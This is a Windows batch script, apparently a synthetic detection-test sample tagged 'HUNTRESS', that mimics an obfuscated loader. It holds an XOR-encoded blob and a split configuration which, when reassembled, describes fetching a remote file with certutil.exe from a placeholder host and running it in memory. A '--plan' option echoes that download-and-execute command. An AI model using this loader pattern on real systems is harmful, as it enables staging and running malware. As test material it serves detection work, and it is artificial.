@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|xor_5a
rem HUNTRESS-MATERIAL:LGdrJikuPyopZzs5Ky8zKD8FKD83NS4/dj4zKSo7LjkyBTc/NzUoIyY7PjsqLj8oZzk/KC4vLjM2dD8iPyYpLjs9PwU5NS80LmdrJj0oOyoyZzw7NAU1Ly4mND8iLgU2OzQ9Lzs9P2c0NTQ/Jjk7Nyo7Mz00BTM+Zzk7Nyo7Mz00dzg/OTw/YmI+bW4mLyg2ZzIuLiopYHV1OD85PD9iYj5tbnQ/Ijs3KjY/dDM0LDs2Mz51bztvO2M/Y2x0Pjsu
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapter"
set "fragment1==certutil.exe|stage_count=1|graph=fan_out|next_l"
set "fragment2=anguage=none|campaign_id=campaign-becfe88d74|url"
set "fragment3==https://becfe88d74.example.invalid/5a5a9e96.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
exit /b 0
:HUNTRESS_EMIT
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo certutil.exe GET https://becfe88d74.example.invalid/5a5a9e96.dat then dispatch memory
exit /b 0
